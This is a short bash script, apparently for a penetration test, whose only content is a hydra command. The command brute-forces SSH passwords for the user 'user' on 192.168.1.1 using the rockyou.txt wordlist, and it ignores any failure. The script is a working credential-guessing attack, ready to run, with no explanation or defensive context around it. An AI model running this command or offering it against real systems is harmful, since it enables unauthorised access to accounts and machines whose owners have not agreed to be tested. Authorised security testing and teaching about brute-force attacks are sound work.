#!/usr/bin/env bash
set -e
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1 || true
